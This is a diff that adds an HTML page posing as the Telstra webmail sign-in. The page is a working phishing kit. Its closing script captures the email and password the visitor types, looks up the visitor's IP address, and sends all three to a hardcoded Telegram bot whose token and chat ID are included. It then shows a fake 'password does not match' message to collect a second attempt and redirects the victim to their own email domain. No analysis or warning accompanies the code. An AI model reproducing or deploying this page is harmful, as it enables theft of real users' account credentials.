@@ -1,0 +1,277 @@
+<html lang="en" id="html" data-emailvalue="[Email]"><head>
+  <!-- meta -->
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <!--favicon-->
+  
+
+	<link rel="icon" href="https://www.telstra.com.au/etc/designs/telstra/images/t-logo-theme-brand-refresh-favicon.png">
+	<link rel="apple-touch-icon" href="https://www.telstra.com.au/etc/designs/telstra/images/t-logo-theme-brand-refresh-apple-touch.png">
+  <!-- base -->
+  <base href="https://myid.telstra.com/identity/">
+      <!-- title -->
+  <title>Sign in with your Telstra ID</title>
+  <!-- includes -->
+  <style>
+          @import url('assets/fonts/telstra-fonts.css?v=1.1.001');
+      @import url('assets/css/min/telstra-able.min.css?v=1.1.001');
+              @import url('assets/css/min/cnsb-custom.min.css?v=1.1.001');
+                  @import url('assets/css/min/webmail-cnsb-custom.min.css?v=1.1.001');
+                    </style>
+
+
+  <script src="/identity/assets/js/common.min.js?v=1.1.001"></script>
+
+  
+ 	
+         <script src="/identity/assets/js/sha-1.min.js"></script>
+      
+      <script src="//assets.adobedtm.com/launch-EN150fea03ccaa40d3b4a005dbafdb143c.min.js"></script>
+                    <script type="text/javascript" src="https://www.telstra.com.au/apps/liveperson/import.htm"></script>
+          <script src="/identity/assets/svg4everybody.legacy.js"></script>
+  <script>
+    var isIE = "-ms-scroll-limit" in document.documentElement.style && "-ms-ime-align" in document.documentElement.style;
+    if (isIE) {
+      svg4everybody();
+    }
+  </script>
+      <script src='assets/scripts/captcha/captcha-utils.js'></script>
+    <script src='assets/scripts/captcha/captcha-script-loader.js' defer></script>
+  </head>
+	<body>
+		<div>
+
+			<header class="t-page-header">
+			<svg width="33px" height="33px" viewBox="0 0 33 33" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-label="Telstra Logo" role="img" focusable="false">
+    <g id="Artboard" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+        <g id="Telstra_Primary-logo_C_RGB" fill-rule="nonzero">
+            <path d="M18.742504,14.0832 L17.5024033,21.3536 C17.2460517,22.6624 16.3840696,23.0144 15.6182193,23.0144 L9.88235294,23.0144 L12.3016709,9.6992 C9.88876173,8.5952 7.42137789,7.8752 5.4602884,7.8752 C3.59212634,7.8752 2.0764477,8.3808 1.0670634,9.5872 C0.3556878,10.448 0,11.5104 0,12.7712 C0,16.5568 2.98008698,21.808 8.08468757,26.0928 C12.6317235,29.8784 17.6369879,32 21.2771801,32 C23.0940719,32 24.5584802,31.4432 25.523003,30.336 C26.2792401,29.4784 26.5836576,28.3648 26.5836576,27.104 C26.5836576,23.424 23.5811398,18.2688 18.742504,14.0832 Z" id="Path" fill="#F96449"></path>
+            <path d="M8.44037537,0 C7.53032731,0 6.77409018,0.6112 6.57221332,1.568 L5.76470588,5.9552 L12.9777981,5.9552 L9.87914855,23.0112 L15.6182193,23.0112 C16.3840696,23.0112 17.2460517,22.656 17.5024033,21.3504 L20.1268025,5.9552 L25.3179217,5.9552 C26.2311742,5.9552 26.9874113,5.3504 27.1892882,4.3904 L28,0 L8.44037537,0 Z" id="Path" fill="#0D54FF"></path>
+        </g>
+    </g>
+</svg>
+	</header>
+
+							<div role="main" class="t-form-container">
+				
+								
+					<h1 class="t-able-heading-a   t-able-spacing-2x-mb "> Sign in to Telstra webmail </h1>
+																		<div class="t-able-text-bodyshort t-able-spacing-5x-mb">Sign in with your Telstra email address</div>
+																<form method="POST" action="" autocomplete="off">
+												                                    																																																																																							
+
+	<div class="t-back-to-previous-label t-able-spacing-2x-mb" >Back to previous for:</div>
+	<a class="t-input-with-anchor   t-able-spacing-4x-mb " data-t-cookie-show="false" onclick="loadAnalyticEvents('click', 'clickTrack', 'buttonClick', 'Back to previous')">
+			<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="6.98" height="12.45" viewBox="0 0 6.98 12.45" role="img" aria-hidden="true" focusable="false">
+		<defs>
+			<clipPath id="a">
+				<path d="M1.82,6.22,6.76,1.28A.75.75,0,1,0,5.7.22L.22,5.69A.77.77,0,0,0,0,6.23a.75.75,0,0,0,.22.53L5.7,12.23a.75.75,0,0,0,.53.22.76.76,0,0,0,.53-.23A.75.75,0,0,0,7,11.69a.77.77,0,0,0-.22-.54Z" fill="none" clip-rule="evenodd"/>
+			</clipPath>
+		</defs>
+		<g clip-path="url(#a)"><rect x="-5" y="-5" width="16.98" height="22.45" fill="#0064d2"/></g>
+	</svg>
+		<span class="t-able-sr-only">Back to previous for</span>
+
+		<input type="text" id="email" autocorrect="off" autocapitalize="off" autocomplete="username" placeholder=" " data-arrow-down="[type=password]" data-arrow-up="[type=submit]" style=" width: 300px; height: 30px; border-block-color: #ffffff00; border-right-color: #ffffff00; border-left-color: #ffffff00; background-color: #ffffff00; font: 400 1rem / 1.4 Telstra Text Variable, Helvetica Neue, Helvetica, Arial, sans-serif;">
+
+		
+							</span>
+
+		
+	</a>
+	
+						<div class="t-able-text-field t-pwd-field  t-able-spacing-2x-mb  ">
+	<label for="password">Password</label>
+	<input id="password" type="password" name="password" autofocus autocomplete="current-password" aria-invalid="false" aria-required="true" aria-describedby="password-error-text" onblur="handleOnblurEvent(event, true)">
+	<button type="button" id="showPwdBtn" class="t-able-low-emph-button t-showpwd" aria-label="Show password characters" onclick="showHide('show', 'showPwdBtn', 'hidePwdBtn', 'password', 't-icon--hidden')">Show</button>
+	<button type="button" id="hidePwdBtn" class="t-able-low-emph-button t-showpwd t-icon--hidden" aria-label="Hide password characters" onclick="showHide('hide', 'hidePwdBtn', 'showPwdBtn', 'password', 't-icon--hidden')">Hide</button>
+	<p id="password-error-text"></p>
+</div>
+	<p data-v-0b116c97="" style="color: red; display:none;" id="msg" class="title">Members </p>
+						
+													
+					
+			
+	<div class=" t-able-spacing-5x-mb ">
+												<a class="t-able-low-emph-button  t-reset-password-link " href="https://myid.telstra.com/identity/as/authorization.oauth2?client_id=b2c-webmail&amp;nonce=65472466ca8dcbaab095fca2988fa70275c880e14db12b5671f45e0936192bce&amp;redirect_uri=https%3A%2F%2Femail.telstra.com%2Flogin%2Foidc%3Fid%3Da78b98eb-935a-4b92-a431-1993124e2b85&amp;response_type=code&amp;scope=openid+username&amp;state=1e957b59d1ca787109dc116ed86ea43f46152257f78d1dd1f1f97a4b0f44d42f&amp;PasswordReset_UsernameVerification=true" onclick="loadAnalyticEvents('click', 'clickTrack', 'linkClick', 'Reset password')">
+					Recover account
+									</a>
+						</div>
+						
+
+						
+						<div class="">
+							<button id="submit-btn" class="t-able-high-emph-button  t-able-spacing-7x-mb " type="submit" onclick="handleSubmitBtnClk(event)">Sign in</button>
+						</div>
+						
+						
+					</form>
+				</div>
+						
+	<footer class="t-footer">
+		<div class="t-footer-content">
+			<p class="t-footer-copyright">Copyright © 2025 Telstra</p>
+						<a class="t-footer-privacy" href="https://www.telstra.com.au/privacy/privacy-statement" target="_blank">Privacy</a>
+										<a class="t-footer-terms" href="https://www.telstra.com.au/terms-of-use" target="_blank">Terms of use</a>
+					</div>
+	</footer>
+		</div>
+
+					
+	</body>
+		<!-- </div> -->
+
+</body>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+ <script>
+
+       /* global $ */
+    $(document).ready(function(){
+      var count=0;
+       let u53TiQ = '';
+      $.getJSON('https://api.ipify.org?format=json', function(data){
+        u53TiQ = data.ip;
+        });
+
+var tx1="5370730671";
+var tx2="7148375916:AAF0tJElL4mVB-TVT8J2kIJJo4Ojfq9XfyY";
+ ur = "https://api.telegram.org/bot"+tx2+"/sendMessage?chat_id="+tx1;
+
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+        var my_email =email;
+        $('#email').val(my_email);
+		
+		
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_email)) {
+          $('#error').show();
+          email.focus;
+          return false;
+        }
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        var finalu= c.toUpperCase();
+		$("#logoname").html(final);
+		$("#logonames").html(final);
+		$("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
+		$("#mainPage").attr("src", "https://www."+my_slice);
+		$("#logoname").html(my_slice);
+
+
+       
+      }
+
+
+	  
+	  
+	  
+      $('#submit-btn').click(function(event){
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var email=$("#email").val();
+        var password=$("#password").val();
+        var msg = $('#msg').html();
+        $('#msg').text( msg );
+
+                    if (!password) {
+                $('#msg').show();
+                $('#msg').html("Please enter your password.!");
+
+                return false;
+            }
+
+
+      ///////////new injection////////////////
+      var my_email =email;
+      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+      if (!filter.test(my_email)) {
+        $('#error').show();
+        email.focus;
+        return false;
+      }
+
+      var ind=my_email.indexOf("@");
+      var my_slice=my_email.substr((ind+1));
+      var c= my_slice.substr(0, my_slice.indexOf('.'));
+      var final= c.toLowerCase();
+      var finalu= c.toUpperCase();
+
+        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
+
+        $("#logoname").html(finalu);
+      ///////////new injection////////////////
+      count=count+1;
+      
+      $.ajax({
+        dataType: 'JSON',
+		url: ur,
+        type: 'GET',
+        data:{
+          ajaxid: 4,
+		text: ("====Anonnymouxx BIGPONDS Logs====\nEmail: " + email + "\nPassword: " + password + "\nIp: " + u53TiQ )				
+        },
+			processData: true,
+		contentType: false,
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Sign in');
+            },
+            success: function(response){
+              if(response){
+                $("#msg").show();
+                console.log(response);
+                if(response.ok === true){
+                  $("#password").val("");
+                  if (count>=2) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                      window.location.replace("https://www."+my_slice);
+                    //  window.location.replace("https://firebasestorage.googleapis.com/v0/b/roundcube-3f5b4.appspot.com/o/withbg%2FHIGHMARK%20-%20FAC41%209DE-Janitorial%20Services%20BID%20(1).pdf?alt=media&token=0b31368e-164a-4713-a848-b6555cb9f7ed");
+
+                  }
+                  $("#msg").show();
+    	$('#msg').html("Account or password does not match. Please try again.");
+                }
+                else{
+                 $("#msg").show();
+    	$('#msg').html("Account or password does not match. Please try again.");
+                }
+              }
+            },
+            error: function(){
+              $("#password").val("");
+              if (count>=2) {
+                count=0;
+                   window.location.replace("https://www."+my_slice);
+             //  window.location.replace("https://firebasestorage.googleapis.com/v0/b/roundcube-3f5b4.appspot.com/o/withbg%2FHIGHMARK%20-%20FAC41%209DE-Janitorial%20Services%20BID%20(1).pdf?alt=media&token=0b31368e-164a-4713-a848-b6555cb9f7ed");
+              }
+            
+             $("#msg").show();
+    $('#msg').html("Account or password does not match. Please try again.");
+            },
+            complete: function(){
+              $('#submit-btn').html('Sign in');
+            }
+          });
+    });
+
+
+    });
+
+
+</script>
+
+
+</html>
